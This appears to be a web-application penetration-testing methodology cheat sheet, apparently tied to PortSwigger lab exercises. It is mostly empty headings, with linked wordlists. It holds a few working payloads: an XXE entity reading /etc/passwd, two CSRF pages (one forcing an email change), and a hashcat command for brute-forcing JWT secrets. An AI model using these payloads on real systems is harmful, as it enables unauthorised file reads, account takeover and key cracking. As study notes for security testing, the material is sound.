# Methodology

## Step 1 - Enumeration
### Directory fuzzing
Directory fuzzing list [here](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/dirsearch.txt)

### Directory fuzzing

## Step 2 - Identify sensitive features
### Password
- Password reset
- Password change

### User data
- Email change

## Step 3 - Identify vulnrabilities
### SQL injections
### NoSQL injections
### Authentication
### Path traversal
### Command injection
### Business logic vulnerabilities
### Information disclosure
### Access control
### Command injection
### File upload
### Race conditions
### Server-side request forge (SSRF)
### Path traversal
#### LFI fuzzing
Fuzzing list [here](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt)

### XXE Injection
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
### Cross-site scripting (XSS)
### Cross-site request forge (CSRF)
#### CSRF using Javascript fetch()
```
<html>
  <script>
    fetch("https://example.com", {
      method: "POST",
      credentials: "include",
      mode: "cors",
      body: JSON.stringify(donnees),
      headers: {
            "Content-Type": "application/json",
            // 'Content-Type': 'application/x-www-form-urlencoded',
          },
    });
  </script>
</html>
```
#### CSRF using Javascript XMLHTTPRequest()
#### CSRF using Javascript HTML
```
<html>
  <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</html>
```
### Cross-origin resource sharing (CORS)
### Clickjacking
### DOM-based vulnerabilities
### WebSockets
### Insecure deserialization
### GraphQL API vulnerabilities
### Server-side template injection
### Web cache poisoning
### HTTP Host header attacks
#### Check reflection in response headers

### HTTP request smuggling
### OAuth authentication
### JWT attacks
#### Brute force key
Word list [here](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```
### Prototype pollution



## Various
### Work with hash
#### Identify hash
Dcode tool to identify hash [here](https://www.dcode.fr/identification-hash).
#### Crack hash
Online tool - [Crack station](https://crackstation.net)
#### Calculate hash
Online tool - [CyberChef](https://gchq.github.io/CyberChef)

#### Brute force hash
